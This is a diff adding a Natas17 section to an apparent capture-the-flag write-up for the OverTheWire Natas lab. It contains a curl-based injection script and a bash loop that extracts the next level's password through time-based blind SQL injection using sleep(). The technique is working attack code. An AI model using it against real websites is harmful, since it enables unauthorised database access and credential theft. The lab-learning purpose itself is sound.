@@ -26,3 +26,20 @@ USER=0;for j in {0..3}; do for((h=1;h<=10;h++)); do RES=$(./injector.sh "(select
 >[+]Found password 1: 6P151OntQe  
 >[+]Found password 2: HLwuGKts2w  
 >[+]Found password 3: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX **<- No spoils ^^**   
+
+
+### Natas17
+
+**Same as before, but without output. So let's get the timing...**
+
+cat injector_timing.sh
+>#!/bin/bash   
+>   
+>DATA=$1   
+>   
+>curl -s 'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' -H 'Cookie: __cfduid=XXXXXXXXXXXXXXXXXXXXXX' -H 'Host: natas17.natas.labs.overthewire.org' -H 'Referer: http://natas17.natas.labs.overthewire.org/' --data "username=test\" or $DATA" > /dev/null   
+
+**Now we know who is the user we are looking for: natas18**
+
+echo -n "[+]Found password for natas18: "; for((h=1;h<40;h++)); do for i in {32..126}; do RES=$( { time ./injector_timing.sh "(select sleep(2) from users where username=%22natas18%22 and ascii(substr(password,$h,1))=%22$i%22) and %221%22=%221"; } 2>&1 ); TIME=$(echo "$RES" | grep real | cut -d' ' -f2 | grep -oP "\d+m\d+" | cut -d'm' -f2); if [[ $TIME > 2 ]] ;then printf \\$(printf '%03o\n' "$i"); break; fi; done;done; echo ""
+>[+]Found password for natas18: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX **<- No spoils ^^**
